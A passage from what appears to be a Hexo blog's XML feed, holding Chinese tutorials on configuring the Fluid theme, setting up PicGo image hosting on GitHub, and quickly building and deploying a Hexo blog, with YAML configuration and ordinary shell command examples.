aria-hidden="true">image-20230923155808379</figcaption></figure></li><li><p><strong>特别注意</strong>：设定仓库名为账户+仓库名；自定义域名需要自己有域名才填写</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654117.png"alt="image-20230923165104951" /><figcaption aria-hidden="true">image-20230923165104951</figcaption></figure></li><li><p>点击<code>设为默认图床</code>，点击<code>确定</code></p></li></ul></li></ul><h2 id="typora">1.3 Typora</h2><p><code>文件</code>→<code>偏好设置</code>→<code>图像</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654118.png"alt="image-20230923163344947" /><figcaption aria-hidden="true">image-20230923163344947</figcaption></figure><h1 id="使用方法">2. 使用方法</h1><p>Typora：<code>格式</code>→<code>图像</code>→<code>上传所有本地图片</code></p><p>参考教程：</p><ol type="1"><li><ahref="https://cnhuazhu.top/butterfly/2021/02/20/GitHub+PicGo+jsDelivr搭建免费图床/">GitHub+PicGo+jsDelivr搭建免费图床| 花猪のBlog (cnhuazhu.top)</a></li><li>https://juejin.cn/post/6992451980379553828</li></ol>]]></content>
    
    
    <categories>
      
      <category>博客搭建</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Fluid主题配置指南</title>
    <link href="/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/Fluid%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/"/>
    <url>/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/Fluid%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="关于指南">1. 关于指南</h1><ul><li>本指南中提到的："<strong>站点配置</strong>" 指的 Hexo 博客目录下的<code>_config.yml</code>，"<strong>主题配置</strong>" 指的是<code>theme/fluid/_config.yml</code> 或者 <code>_config.fluid.yml</code>，注意区分；</li><li>本指南中提到的 <code>source</code> 目录都指的是博客目录下的<code>source</code> 文件夹，不推荐修改主题内 <code>source</code>目录；</li></ul><h1 id="全局">2. 全局</h1><h2 id="覆盖配置">2.1 覆盖配置</h2><ul><li><p>在博客根目录下创建 <code>_config.fluid.yml</code> 文件，将主题的<code>_config.yml</code>（不是根目录下的<code>_config.yml</code>）全部配置复制过去，以后如果修改任何主题配置，都只需修改<code>_config.fluid.yml</code> 的配置即可；</p></li><li><p>只要存在于 <code>_config.fluid.yml</code>的配置都是高优先级，修改原 <code>_config.yml</code> 是无效的;</p></li><li><p>每次更新主题可能存在配置变更，请注意更新说明，可能需要手动对<code>_config.fluid.yml</code> 同步修改;</p></li><li><p>想查看覆盖配置有没有生效，可以通过 <code>hexo g --debug</code>查看命令行输出;</p></li><li><p>如果想将某些配置覆盖为空，注意不要把主键删掉，不然是无法覆盖的，比如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">about:</span><br>  <span class="hljs-attr">icons:</span>  <span class="hljs-comment"># 不要把 icon 注释掉，否则无法覆盖配置</span><br>    <span class="hljs-comment"># - &#123; class: &#x27;iconfont icon-github-fill&#x27;, link: &#x27;https://github.com&#x27; &#125;</span><br>    <span class="hljs-comment"># - &#123; class: &#x27;iconfont icon-wechat-fill&#x27;, qrcode: &#x27;/img/favicon.png&#x27; &#125;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="博客标题">2.2 博客标题</h2><p>页面左上角的博客标题，默认使用<strong>站点配置</strong>中的<code>title</code>，这个配置同时控制着网页在浏览器标签中的标题。如需单独区别设置，可在<strong>主题配置</strong>中设置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 导航栏的相关配置</span><br><span class="hljs-comment"># Navigation bar</span><br><span class="hljs-attr">navbar:</span><br>  <span class="hljs-comment"># 导航栏左侧的标题，为空则按 hexo config 中 `title` 显示</span><br>  <span class="hljs-comment"># The title on the left side of the navigation bar. If empty, it is based on `title` in hexo config</span><br>  <span class="hljs-attr">blog_title:</span> <span class="hljs-string">&quot;kaikaikai&#x27;s blog&quot;</span><br></code></pre></td></tr></table></figure><h2 id="导航菜单">2.3 导航菜单</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 导航栏菜单，可自行增减，key 用来关联 languages/*.yml，如不存在关联则显示 key 本身的值；icon 是 css class，可以省略；增加 name 可以强制显示指定名称</span><br> <span class="hljs-comment"># Navigation bar menu. `key` is used to associate languages/*.yml. If there is no association, the value of `key` itself will be displayed; if `icon` is a css class, it can be omitted; adding `name` can force the display of the specified name</span><br> <span class="hljs-attr">menu:</span><br>   <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;home&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-attr">icon:</span> <span class="hljs-string">&quot;iconfont icon-home-fill&quot;</span> &#125;<br>   <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;archive&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;/archives/&quot;</span>, <span class="hljs-attr">icon:</span> <span class="hljs-string">&quot;iconfont icon-archive-fill&quot;</span> &#125;<br>   <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;category&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;/categories/&quot;</span>, <span class="hljs-attr">icon:</span> <span class="hljs-string">&quot;iconfont icon-category-fill&quot;</span> &#125;<br>   <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;tag&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;/tags/&quot;</span>, <span class="hljs-attr">icon:</span> <span class="hljs-string">&quot;iconfont icon-tags-fill&quot;</span> &#125;<br>   <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">key:</span> <span class="hljs-string">&quot;about&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;/about/&quot;</span>, <span class="hljs-attr">icon:</span> <span class="hljs-string">&quot;iconfont icon-user-fill&quot;</span> &#125;<br>   <span class="hljs-comment">#- &#123; key: &quot;links&quot;, link: &quot;/links/&quot;, icon: &quot;iconfont icon-link-fill&quot; &#125;</span><br></code></pre></td></tr></table></figure><h2 id="展示pv与uv统计">2.4 展示PV与UV统计</h2><p>页脚可以展示 PV 与 UV 统计数据，目前支持两种数据来源：<ahref="https://www.leancloud.cn/">LeanCloud</a>与 <ahref="http://busuanzi.ibruce.info/">不蒜子</a>。</p><p>相关<strong>主题配置</strong>如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">footer:</span><br>  <span class="hljs-attr">statistics:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">source:</span> <span class="hljs-string">&quot;busuanzi&quot;</span>  <span class="hljs-comment"># 可选 leancloud | busuanzi  根据自己需求选择</span><br>    <span class="hljs-attr">pv_format:</span> <span class="hljs-string">&quot;总访问量 &#123;&#125; 次&quot;</span>  <span class="hljs-comment"># 显示的文本，&#123;&#125;是数字的占位符（必须包含)，下同</span><br>    <span class="hljs-attr">uv_format:</span> <span class="hljs-string">&quot;总访客数 &#123;&#125; 人&quot;</span><br></code></pre></td></tr></table></figure><h2 id="语言配置">2.5 语言配置</h2><p>不同语言会影响一些主题自带的文字。设置语言是在<strong>站点配置</strong>中，需要对应<code>fluid/languages/</code> 目录内的配置文件名:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">language:</span> <span class="hljs-string">zh-CN</span><br></code></pre></td></tr></table></figure><h1 id="首页">3. 首页</h1><h2 id="文章摘要">3.1 文章摘要</h2><p>开关自动摘要（默认开启）：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">index:</span><br>  <span class="hljs-attr">auto_excerpt:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>若要手动指定摘要，使用 <code>&lt;!-- more --&gt;</code>MD文档里划分，如：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">正文的一部分作为摘要<br>&lt;!-- more --&gt;<br>余下的正文<br></code></pre></td></tr></table></figure><p>或者在 <ahref="https://hexo.io/zh-cn/docs/front-matter">front-matter</a>里设置<code>excerpt</code> 字段，如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">这是标题</span><br><span class="hljs-attr">excerpt:</span> <span class="hljs-string">这是摘要</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>TIP</p><ul><li><p>优先级: 手动摘要 &gt; 自动摘要</p></li><li><p>如果关闭自动摘要，并且没有设置手动摘要，摘要区域空白</p></li><li><p>无论哪种摘要都最多显示 3行，当屏幕宽度不足时会隐藏部分摘要。</p></li></ul><h2 id="文章跳转方式">3.2 文章跳转方式</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 打开文章的标签方式</span><br>  <span class="hljs-comment"># The browser tag to open the post</span><br>  <span class="hljs-comment"># Available: _blank | _self</span><br>  <span class="hljs-attr">post_url_target:</span> <span class="hljs-string">_self</span><br></code></pre></td></tr></table></figure><h2 id="文章信息">3.3 文章信息</h2><p>可配置隐藏包括发布时间、分类、标签。经过测试，如果首页的文章列表中没有略缩图和摘要，标题+文章信息的显示方式会使页面过于拥挤，所以给出此项配置供喜欢首页只显示文章标题的同学使用。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">index:</span><br>  <span class="hljs-attr">post_meta:</span><br>    <span class="hljs-attr">date:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">category:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">tag:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="隐藏文章">3.4 隐藏文章</h2><p>如果想把某些文章隐藏，<strong>不在首页和其他归档分类页里展示</strong>，可以在文章开头<a href="https://hexo.io/zh-cn/docs/front-matter">front-matter</a>中配置<code>hide: true</code> 属性。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">文章标题</span><br><span class="hljs-attr">index_img:</span> <span class="hljs-string">/img/example.jpg</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2019-10-10 10:00:00</span><br><span class="hljs-attr">hide:</span> <span class="hljs-literal">true</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">以下是文章内容</span><br></code></pre></td></tr></table></figure><p>隐藏后依然可以通过文章链接访问，所以可以用于一些需要链接跳转的特殊文章。</p><h2 id="归档文章">3.5 归档文章</h2><p>如果只是想让文章在首页隐藏，但仍<strong>需要在归档分类页里展示</strong>，可以在文章开头<a href="https://hexo.io/zh-cn/docs/front-matter">front-matter</a>中配置<code>archive: true</code> 属性。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">文章标题</span><br><span class="hljs-attr">index_img:</span> <span class="hljs-string">/img/example.jpg</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2019-10-10 10:00:00</span><br><span class="hljs-attr">archive:</span> <span class="hljs-literal">true</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">以下是文章内容</span><br></code></pre></td></tr></table></figure><h2 id="文章排序">3.6 文章排序</h2><p>如果想手动将某些文章固定在首页靠前的位置，可以在安装<code>hexo-generator-index</code> &gt;= 2.0.0 版本的情况下，在文章开头<a href="https://hexo.io/zh-cn/docs/front-matter">front-matter</a>中配置<code>sticky</code> 属性：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">文章标题</span><br><span class="hljs-attr">index_img:</span> <span class="hljs-string">/img/example.jpg</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2019-10-10 10:00:00</span><br><span class="hljs-attr">sticky:</span> <span class="hljs-number">100</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">以下是文章内容</span><br></code></pre></td></tr></table></figure><p><code>sticky</code>数值越大，该文章越靠前，达到类似于置顶的效果，其他未设置的文章依然按默认排序。</p><p>当文章设置了 <code>sticky</code>后，主题会默认在首页文章标题前增加一个图标，来标识这是一个置顶文章，你可以通过<strong>主题配置</strong>去关闭或修改这个功能：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">index:</span><br>  <span class="hljs-attr">post_sticky:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">icon:</span> <span class="hljs-string">&#x27;iconfont icon-top&#x27;</span><br></code></pre></td></tr></table></figure><p><code>icon</code> 可以通过<ahref="https://fluid-dev.github.io/hexo-fluid-docs/icon/">自定义图标</a>修改为其他图标。</p><h1 id="文章页">4. 文章页</h1><h2 id="文章封面图">4.1 文章封面图</h2><p>对于单篇文章，在文章开头 <ahref="https://hexo.io/zh-cn/docs/front-matter">front-matter</a>中配置<code>index_img</code> 属性。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">文章标题</span><br><span class="hljs-attr">tags:</span> [<span class="hljs-string">Hexo</span>, <span class="hljs-string">Fluid</span>]<br><span class="hljs-attr">index_img:</span> <span class="hljs-string">/img/example.jpg</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2019-10-10 10:00:00</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">以下是文章内容</span><br></code></pre></td></tr></table></figure><p>和 Banner 配置相同，<code>/img/example.jpg</code> 对应的是存放在<code>/source/img/example.jpg</code>目录下的图片（目录也可自定义，但必须在 source 目录下）。</p><p>也可以使用外链 Url 的绝对路径。</p><p>如果想统一给文章设置一个默认图片（文章不设置 <code>index_img</code>则默认使用这张图片），可在<strong>主题配置</strong>中设置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">post:</span><br>  <span class="hljs-attr">default_index_img:</span> <span class="hljs-string">/img/example.jpg</span><br></code></pre></td></tr></table></figure><p>当 <code>default_index_img</code> 和 <code>index_img</code>都为空时，该文章在首页将不显示图片。</p><h2 id="文章内容图片">4.2 文章内容图片</h2><p>本地图片存放位置同上。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">![](<span class="hljs-link">/img/example.jpg</span>)<br></code></pre></td></tr></table></figure><h2 id="代码块">4.3 代码块</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">code:</span><br>  <span class="hljs-attr">copy_btn:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">highlight:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">line_number:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">lib:</span> <span class="hljs-string">&quot;highlightjs&quot;</span><br>    <span class="hljs-attr">highlightjs:</span><br>      <span class="hljs-attr">style:</span> <span class="hljs-string">&#x27;Github Gist&#x27;</span><br>      <span class="hljs-attr">bg_color:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">prismjs:</span><br>      <span class="hljs-attr">style:</span> <span class="hljs-string">&quot;default&quot;</span><br>      <span class="hljs-attr">preprocess:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><code>copy_btn</code>: 是否开启复制代码的按钮</p><p><code>line_number</code>: 是否开启行号</p><p><code>highlight</code>: 是否开启代码高亮</p><p><code>lib</code>: 选择生成高亮的库，可选项:<code>highlightjs</code>、<code>prismjs</code>，对应下面两组配置，高亮的配置说明具体见<strong>主题配置</strong>中的注释</p><h2 id="latex-数学公式">4.4 LaTeX 数学公式</h2><ol type="1"><li><p>修改配置文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">post:</span><br>  <span class="hljs-attr">math:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">specific:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">engine:</span> <span class="hljs-string">mathjax</span><br></code></pre></td></tr></table></figure></li><li><p>更换 Markdown 渲染器(mathjax)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnpm uninstall hexo-renderer-marked --save<br>cnpm install hexo-renderer-pandoc --save<br></code></pre></td></tr></table></figure></li><li><p>安装pandoc（需重启电脑）：<ahref="https://github.com/jgm/pandoc/blob/main/INSTALL.md">pandoc/INSTALL.mdat main · jgm/pandoc (github.com)</a></p></li></ol><h1 id="front-matter">5. Front-matter</h1><p>Front-matter 是文件最上方以 <code>---</code>分隔的区域，用于指定个别文件的变量，举例来说：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">Hello</span> <span class="hljs-string">World</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2013</span><span class="hljs-string">/7/13</span> <span class="hljs-number">20</span><span class="hljs-string">:46:25</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>以下是预先定义的参数，您可在模板中使用这些参数值并加以利用。</p><table><thead><tr class="header"><th style="text-align: left;">参数</th><th style="text-align: left;">描述</th><th style="text-align: left;">默认值</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><code>layout</code></td><td style="text-align: left;">布局</td><td style="text-align: left;"><ahref="https://hexo.io/zh-cn/docs/configuration#文章"><code>config.default_layout</code></a></td></tr><tr class="even"><td style="text-align: left;"><code>title</code></td><td style="text-align: left;">标题</td><td style="text-align: left;">文章的文件名</td></tr><tr class="odd"><td style="text-align: left;"><code>date</code></td><td style="text-align: left;">建立日期</td><td style="text-align: left;">文件建立日期</td></tr><tr class="even"><td style="text-align: left;"><code>updated</code></td><td style="text-align: left;">更新日期</td><td style="text-align: left;">文件更新日期</td></tr><tr class="odd"><td style="text-align: left;"><code>comments</code></td><td style="text-align: left;">开启文章的评论功能</td><td style="text-align: left;"><code>true</code></td></tr><tr class="even"><td style="text-align: left;"><code>tags</code></td><td style="text-align: left;">标签（不适用于分页）</td><td style="text-align: left;"></td></tr><tr class="odd"><td style="text-align: left;"><code>categories</code></td><td style="text-align: left;">分类（不适用于分页）</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: left;"><code>permalink</code></td><td style="text-align: left;">覆盖文章的永久链接，永久链接应该以<code>/</code> 或 <code>.html</code> 结尾</td><td style="text-align: left;"><code>null</code></td></tr><tr class="odd"><td style="text-align: left;"><code>excerpt</code></td><td style="text-align: left;">纯文本的页面摘要。使用 <ahref="https://hexo.io/zh-cn/docs/tag-plugins#文章摘要和截断">该插件</a>来格式化文本</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: left;"><code>disableNunjucks</code></td><td style="text-align: left;">启用时禁用 Nunjucks 标签<code>&#123;&#123; &#125;&#125;</code>/<code>&#123;% %&#125;</code> 和<a href="https://hexo.io/zh-cn/docs/tag-plugins">标签插件</a>的渲染功能</td><td style="text-align: left;">false</td></tr><tr class="odd"><td style="text-align: left;"><code>lang</code></td><td style="text-align: left;">设置语言以覆盖 <ahref="https://hexo.io/zh-cn/docs/internationalization#路径">自动检测</a></td><td style="text-align: left;">继承自 <code>_config.yml</code></td></tr><tr class="even"><td style="text-align: left;"><code>published</code></td><td style="text-align: left;">文章是否发布</td><td style="text-align: left;">对于 <code>_posts</code> 下的文章为<code>true</code>，对于 <code>_draft</code> 下的文章为<code>false</code></td></tr></tbody></table><h1 id="关于页">6. 关于页</h1><h2 id="创建关于页">6.1 创建关于页</h2><p>首次使用主题的「关于页」需要手动创建：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new page about<br></code></pre></td></tr></table></figure><p>创建成功后修改 <code>/source/about/index.md</code>，添加<code>layout</code> 属性。</p><p>修改后的文件示例如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">标题</span><br><span class="hljs-attr">layout:</span> <span class="hljs-string">about</span><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">这里可以写正文，支持</span> <span class="hljs-string">Markdown,</span> <span class="hljs-string">HTML</span><br></code></pre></td></tr></table></figure><p>WARNING：<code>layout: about</code>必须存在，并且不能修改成其他值，否则不会显示头像等样式。</p><h2 id="关于信息">6.2 关于信息</h2><p>在关于页介绍自己的基础信息，可以在<strong>主题配置</strong>中设置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">about:</span><br>  <span class="hljs-attr">avatar:</span> <span class="hljs-string">/img/avatar.png</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;Fluid&quot;</span><br>  <span class="hljs-attr">intro:</span> <span class="hljs-string">&quot;An elegant theme for Hexo&quot;</span><br></code></pre></td></tr></table></figure><h2 id="社交页图标">6.3 社交页图标</h2><p>在<strong>主题配置</strong>中设置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">about:</span><br>  <span class="hljs-attr">icons:</span><br>    <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">class:</span> <span class="hljs-string">&#x27;iconfont icon-github-fill&#x27;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&#x27;https://github.com&#x27;</span>, <span class="hljs-attr">tip:</span> <span class="hljs-string">&#x27;GitHub&#x27;</span> &#125;<br>    <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">class:</span> <span class="hljs-string">&#x27;iconfont icon-douban-fill&#x27;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&#x27;https://douban.com&#x27;</span>, <span class="hljs-attr">tip:</span> <span class="hljs-string">&#x27;豆瓣&#x27;</span> &#125;<br>    <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">class:</span> <span class="hljs-string">&#x27;iconfont icon-wechat-fill&#x27;</span>, <span class="hljs-attr">qrcode:</span> <span class="hljs-string">&#x27;/img/favicon.png&#x27;</span> &#125;<br></code></pre></td></tr></table></figure><ul><li><code>class</code>: 图标的<code>css class</code>，主题内置图标详见<ahref="https://fluid-dev.github.io/hexo-fluid-docs/icon/">这里</a></li><li><code>link</code>: 跳转链接</li><li><code>tip</code>: 鼠标悬浮在图标上显示的提示文字</li><li><code>qrcode</code>:二维码图片，当使用此字段后，点击不再跳转，而是悬浮二维码</li></ul><p>参考教程：</p><ol type="1"><li>https://fluid-dev.github.io/hexo-fluid-docs/guide/</li></ol>]]></content>
    
    
    <categories>
      
      <category>博客搭建</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>快速搭建hexo博客</title>
    <link href="/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="前期准备">1. 前期准备</h1><h2 id="安装node.js">1.1 安装Node.js</h2><p>官网链接：https://nodejs.org/en</p><p>安装教程：<ahref="https://blog.csdn.net/WHF__/article/details/129362462?spm=1001.2014.3001.5506">Node.js下载安装及环境配置教程【超详细】_nodejs下载-CSDN博客</a></p><p>npm运行报错解决方案：<ahref="https://blog.csdn.net/weixin_37861326/article/details/104295379?spm=1001.2014.3001.5506">npm运行时报错“因为在此系统上禁止运行脚本”解决办法_npm : 无法加载文件c:files.ps1,因为在此系__cris的博客-CSDN博客</a></p><h2 id="注册github账户">1.2 注册github账户</h2><h2 id="安装hexo">1.3 安装hexo</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnpm install -g hexo-cli<br></code></pre></td></tr></table></figure><h1 id="快速搭建">2. 快速搭建</h1><h2 id="创建根目录">2.1 创建根目录</h2><p>本地创建一个文件夹，作为博客部署的空间，后续操作均基于该根目录</p><h2 id="初始化">2.2 初始化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo init<br></code></pre></td></tr></table></figure><h2 id="启动本地服务">2.3 启动本地服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo s<br></code></pre></td></tr></table></figure><h2 id="新建文章">2.4 新建文章</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo n <span class="hljs-string">&quot;My first blog&quot;</span><br></code></pre></td></tr></table></figure><h2 id="清理缓存">2.5 清理缓存</h2><p>注：每次无论 <code>hexo g</code> 或 <code>hexo s</code>，都最好先使用<code>hexo clean</code> 清除本地缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo clean<br></code></pre></td></tr></table></figure><h2 id="生成静态文件">2.6 生成静态文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo g<br></code></pre></td></tr></table></figure><h1 id="部署到github">3. 部署到github</h1><h2 id="新建仓库">3.1 新建仓库</h2><p>注：命名格式为固定要求</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 